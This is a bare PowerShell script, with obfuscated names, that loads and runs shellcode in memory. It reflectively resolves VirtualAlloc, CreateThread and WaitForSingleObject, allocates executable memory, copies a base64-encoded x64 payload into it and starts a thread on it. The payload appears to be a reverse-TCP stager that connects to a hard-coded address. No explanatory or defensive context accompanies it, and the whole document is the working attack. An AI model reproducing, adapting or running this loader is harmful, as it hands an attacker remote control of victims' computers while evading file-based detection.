function r_KpX {
	Param ($mZ, $uD)		
	$mn = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $mn.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($mn.GetMethod('GetModuleHandle')).Invoke($null, @($mZ)))), $uD))
}

function fEn {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $pt,
		[Parameter(Position = 1)] [Type] $bj1 = [Void]
	)
	
	$ctF8P = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$ctF8P.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $pt).SetImplementationFlags('Runtime, Managed')
	$ctF8P.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $bj1, $pt).SetImplementationFlags('Runtime, Managed')
	
	return $ctF8P.CreateType()
}

[Byte[]]$dwCW6 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAATSCgoOFkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$ps = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((r_KpX kernel32.dll VirtualAlloc), (fEn @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dwCW6.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($dwCW6, 0, $ps, $dwCW6.length)

$y6Gm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((r_KpX kernel32.dll CreateThread), (fEn @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ps,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((r_KpX kernel32.dll WaitForSingleObject), (fEn @([IntPtr], [Int32]))).Invoke($y6Gm,0xffffffff) | Out-Null
